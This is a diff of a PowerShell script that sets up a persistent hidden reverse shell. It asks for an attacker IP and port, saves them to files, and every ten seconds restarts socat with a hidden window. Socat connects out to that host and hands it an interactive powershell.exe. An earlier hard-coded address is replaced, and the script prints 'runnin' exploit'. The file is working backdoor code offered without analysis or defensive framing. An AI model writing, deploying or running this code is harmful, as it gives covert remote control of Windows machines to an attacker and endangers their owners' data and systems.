@@ -1,18 +1,39 @@
+if (Test-Path -Path 'C:\Program Files\ZOLOFT\ZOLOFT\socat-windows-master\ipaddress' -PathType Leaf ){
+	Write-Host "Parameters Already Set"
+	
+}else{
+
+$Ip = Read-Host "Please enter IP adress 0.0.0.0:"
+Write-Host "IP set to $Ip"
+New-Item -Path ./ -Name "ipaddress" -ItemType Files 
+echo $Ip > ipaddress
+Write-Host "Created IP Persistance"
+$Port = Read-Host "Please enter Port Number 4 digits: "
+Write-Host "Port Number set to $Port" 
+New-Item -Path ./ -Name "portnumber" -ItemType File 
+echo $Port > portnumber
+Write-Host "Created Port Persistance"
+}
+
 $scriptBlock = [Scriptblock]::Create(@'
-  if(Get-Process -Name socat | ForEach-Object { Get-NetTCPConnection -OwningProcess $_.Id -ErrorAction SilentlyContinue } ){
-	Write-Host "running,..."
-	Stop-Process -Name socat
+if(Get-Process -Name socat){
+	Write-Host "socat running..."
+	
 	
 	
 }else{
-	Write-Host "not running, bye bye..."	
-	powershell.exe -windowstyle hidden .\socat -d -d TCP4:172.17.180.29:4536 EXEC:'powershell.exe',pipes
+	Write-Host "runnin' exploit"	
+	
+powershell.exe -windowstyle hidden .\socat -d -d TCP4:${Ip}:${Port} EXEC:'powershell.exe',pipes
 }
 '@)
-while($true){
 
+while($true){
+$Ip = Get-Content ipaddress
+$Port = Get-Content portnumber
 Invoke-Command -ScriptBlock $scriptBlock
 Start-Sleep -Seconds 10
+
 
 
 }
